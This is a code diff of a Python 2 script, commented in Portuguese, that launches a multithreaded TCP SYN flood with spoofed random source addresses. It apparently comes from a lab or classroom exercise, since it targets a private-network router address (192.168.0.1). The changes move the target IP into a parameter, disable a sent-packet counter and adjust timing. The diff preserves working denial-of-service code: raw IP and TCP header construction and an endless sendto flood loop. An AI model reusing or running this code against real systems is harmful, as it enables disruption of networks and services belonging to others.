@@ -31,15 +31,16 @@ def menu():
     return x
 
 
-def show_begin():
+def show_begin(ip_dest):
     import time
-    print 'Inciando o ataque...\n'
+    print 'Iniciando o ataque ao roteador', ip_dest 
+
     time.sleep(3) 
 
 def show_who(ip,numero):
     print ' O servidor ',ip,'esta sendo atacado pela thread ',numero
 
-def attack(numero_thread): 
+def attack(numero_thread, dest_ip): 
     #create a raw socket
     #import time
 
@@ -62,8 +63,7 @@ def attack(numero_thread):
     #source_ip = '.'.join('%s'%random.randint(2, 254) for i in range(4)) 
     #source_ip = '192.168.0.17'
     #dest_ip = '192.168.0.101' # victor
-    dest_ip = '192.168.0.1' # gabriel
-    show_who(dest_ip,numero_thread)
+    #show_who(dest_ip,numero_thread)
     # ip header fields
     ihl = 5
     version = 4
@@ -104,7 +104,7 @@ def attack(numero_thread):
      
     #Send the packet finally - the port specified has no effect
     #print 'O servidor',dest_ip,'esta sendo atacado'
-    contador=0
+    #contador=0
     #put the above line in a loop like while 1: if you want to flood
     while not flag_encerra_threads:
         #parte de gerar o pacote IP, para cada novo endereco de origem de IP gerado
@@ -124,9 +124,9 @@ def attack(numero_thread):
         source_address = socket.inet_aton( source_ip )
         tcp_length = len(tcp_header)
 
-        if contador > 49999:
-            print 'Foram enviados ',contador,' mensagens de SYN pela thread ',numero_thread 
-            contador=0
+        # if contador > 49999:
+        #     print 'Foram enviados ',contador,' mensagens de SYN pela thread ',numero_thread 
+        #     contador=0
         psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
         psh = psh + tcp_header;
          
@@ -139,7 +139,7 @@ def attack(numero_thread):
         packet = ip_header + tcp_header
 
         s.sendto(packet, (dest_ip , 0 ))    # put this in a loop if you want to flood the target
-        contador = contador + 1
+        #contador = contador + 1
 
     s.close() # encerra o socket
 
@@ -161,24 +161,26 @@ def main():
 
 	qnt = menu()
 
+	dest_ip = '192.168.0.1' # ip que deseja atacar
+
 	for i in range(0, qnt):
-		
-		ataque.append(Thread(target = attack, args = [i]))
-		
+		ataque.append(Thread(target = attack, args = [i, dest_ip]))
+	
+	
 	# ataque1 = Thread(target=attack,args=[5000])
 	# ataque2 = Thread(target=attack,args=[6001])
 	# ataque3 = Thread(target=attack,args=[7002])
 	# ataque4 = Thread(target=attack,args=[8003])
 	#time = Thread(target=count_time,args=[10])
 
-	show_begin()
+	show_begin(dest_ip)
 
 	for i in range (0, qnt):
 		ataque[i].setDaemon(True)
 		ataque[i].start()
 
 	while True:
-		time.sleep(20)
+		time.sleep(40)
 		resp = raw_input('Deseja encerrar o ataque(0 ou 1)? ')
 		if(resp == '1'):
  			flag_encerra_threads = True
